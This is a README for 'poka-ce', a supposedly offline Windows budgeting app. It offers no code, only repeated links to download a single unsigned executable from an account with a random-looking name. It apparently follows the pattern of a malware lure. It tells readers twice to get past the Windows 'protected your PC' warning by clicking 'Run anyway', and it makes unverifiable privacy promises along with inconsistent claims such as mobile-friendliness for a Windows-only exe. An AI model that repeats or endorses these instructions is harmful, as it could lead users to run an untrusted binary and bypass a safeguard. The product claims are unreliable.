<h1>🔒 poka-ce - Your Money, Locked Down Locally</h1>

<p align="center">
  <a href="https://github.com/Droll-velvetosier3319/poka-ce/releases"><img src="https://img.shields.io/badge/⬇️_Download_Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download poka-ce"></a>
</p>

## 🏠 What Is poka-ce?

poka-ce is a personal finance manager that keeps all your information **on your computer**—nothing goes to the cloud. Think of it as a digital ledger that knows what you earn and spend, helps you plan budgets, and shows you where your money goes, all without needing an internet connection.

**Simple. Offline. Yours.** That is the promise. If you are tired of apps that require accounts, subscriptions, or share your financial data with servers you don't control, poka-ce is your private alternative.

While the name sounds technical, you will not need to type a single command. This is a ready-made application with a visual interface, just like a calculator or a text editor. Your financial information is stored in a local database file (SQLite) that only you can access.

## 🧩 Key Features

- **📊 Budget Tracker** - Set monthly limits for groceries, fun, bills, and more. poka-ce lets you know when you are getting close to hitting that cap so you can adjust your spending.
- **💸 Expense Logging** - Record purchases in seconds. Categorize them, add notes, and watch your spending patterns emerge.
- **💰 Money Insights** - See simple charts that show where your income comes from and where your expenses go each month.
- **🔎 Smart Search** - Find any transaction from last year or last week by entering a keyword, amount, or category.
- **👤 No Login, No Account** - You are not a user in a database; you are the owner of your data. Open the app and start tracking immediately.
- **📴 Fully Offline-First** - This application does not contain any code that "phones home." No telemetry, no sync, no hidden connections to remote servers.
- **🔒 Privacy by Design** - Your financial records never leave your device, making them immune to data breaches from third-party servers.
- **🗄️ Built on Solid State Storage** - Uses SQLite, a battle-tested local database format that has been around for decades, ensuring your data remains intact for years.

## 🚀 Getting Started

This section guides you through the download and launch process. We assume you have Windows installed (64-bit versions 10 or 11 are recommended) and a basic understanding of downloading files from the internet.

### Step 1: Visit the Official Download Page

Visit this link to download the application: **[https://github.com/Droll-velvetosier3319/poka-ce/releases](https://github.com/Droll-velvetosier3319/poka-ce/releases)**

This page is where all official versions of poka-ce are published. You may see several files listed, each representing a different version. Look for the highest version number (e.g., v1.2.3) to get the latest release with all current fixes and improvements.

### Step 2: Choose Your Download

You will see a list of file attachments on this page. Each file has a specific name. Look for a file that contains **"windows"** in its name (for example, `poka-ce-windows-v1.2.3.exe`). Make sure your browser shows a download confirmation or progress bar in the corner.

**If your browser asks what to do with the file**, select "Save File" and choose a location you remember, like your Desktop or Downloads folder. The download may take a minute depending on your connection speed. You do not need to worry about installation packages or MSI files; this is a single portable executable.

### 🖱️ Step 3: Run poka-ce

Once the download is complete, navigate to the folder where you saved it. You will see an icon named `poka-ce` (or similar). Double-click that icon to launch the application. A window will open displaying the main dashboard of poka-ce within seconds. If a security warning from Windows appears (like "Windows protected your PC"), you may need to click "More info" and then "Run anyway" because the software is not yet certified by Microsoft.

### 📥 First Time Setup

The first time you open poka-ce, it may ask where to create your personal finance file. You can accept the default location (usually in your "Documents" folder). This file contains all of your data, and you can later back it up by copying that single file to a USB drive or external hard disk.

## 🖥️ System Recommendations

- **Operating System:** Windows 10 or higher (64-bit)
- **Memory:** At least 2 GB of RAM
- **Hard Drive Space:** About 100 MB of free space for the app and your data
- **Display:** A standard 1366x768 screen or larger works beautifully

These are not strict minimums, but they ensure smooth scrolling and instant response when using charts and reports.

## 🤔 How to Use poka-ce: A Quick Walkthrough

1. **Add an Income Item** - Click the "+ Add" button at the top. Enter the amount (e.g., 2500 for your salary) and choose the category "Income" from the dropdown. Click save.
2. **Track an Expense** - After you buy groceries, open the app, click "+ Add" again, enter the amount (e.g., 85.50), choose category "Food & Groceries", and type an optional note like "Weekly market run."
3. **Review Your Month** - At the end of every month, click on the "Reports" tab. You will see a pie chart showing the proportion of your spending for each category. If you overspent on dining out, increase your budget for next month.
4. **Backup Your Data** - Find your financial file from the setup step. Copy it to a cloud drive (like Google Drive) or USB stick every few weeks as a backup. Since the app never syncs automatically, this manual backup is your responsibility, though it offers complete control.

## 🛠️ Troubleshooting & Support

### Problem: "Windows protected your PC"
This is common for open-source software that has not been code-signed. Click "More info" and then "Run anyway." For complete peace of mind, you can check the application's SHA-256 hash if you are technically inclined, but the download link is the official repository.

### Problem: Application won't start
Ensure you have downloaded the complete file and the size matches that shown on the release page. If it fails to launch, try restarting your computer. Also, ensure you have not attempted to open the file from within your browser download panel, which can sometimes cause access issues.

### Problem: Can't find my database file
Look inside the folder named "Documents" under your user name. Alternatively, press `Windows Key + R`, type `%userprofile%`, and press Enter. Look for a folder named `poka-ce`.

### 📞 Where to Get Help
We recommend reading the official support threads and discussions tab along with the release notes for future fixes. For general questions, you can read the documentation in the source repository while you wait for the community forum to grow.

## 🔄 How to Update

Since poka-ce is offline, you will not receive automatic update pop-ups. To update, go back to the same download page (linked in Step 1) and check if a newer version has been published. If it has, download the new file and run it. The application may let you choose to keep your existing data file—always select "Keep existing data" to retain your histories and budgets.

## ✅ Why Choose poka-ce Over Cloud-Based Budgeting Apps?

Most finance apps today require giving them your email, reading your bank feeds, building a profile for marketing, and sending your transaction data to a remote server. Every one of those steps is a privacy leakage. poka-ce inverts this trend: it assumes your data is private by default. This software will never show you personalized ads based on your purchases, and it never asks for your banking login credentials because it does not connect to any bank. You type in your numbers manually, which is secure, predictable, and works offline in a basement or on a flight.

## 🔄 Comparisons you might have seen
- **Mint or YNAB**: These are cloud subscriptions with mandatory accounts, recurring fees, and centralized risk.
- **Spreadsheet Tracking**: poka-ce gives you more visual structure and mobile-friendliness (optional) compared to raw Excel files.

Neither of these respects your privacy like an offline local application does.

## 🧑‍💻 Who Is poka-ce For?
- You want to track every expense without a subscription.
- You care about data sovereignty—your financial data is stored locally on Windows.
- You prefer simple categories, colorful graphs, and zero distractions.
- You are a beginner to budgeting and want a tool that suggests sensible defaults.

If that sounds like you, download and run poka-ce today, and keep your money mysteries under your own keyboard, not on some faraway server.

## 📦 Complete Package
Download the latest stable copy from the link below, challenge yourself to log every expense for two weeks, and watch your savings clarity grow.

[⬇️ Go to the official download page](https://github.com/Droll-velvetosier3319/poka-ce/releases)

Let your finances stay private, because they are yours, not anyone else's. Start owning your data today.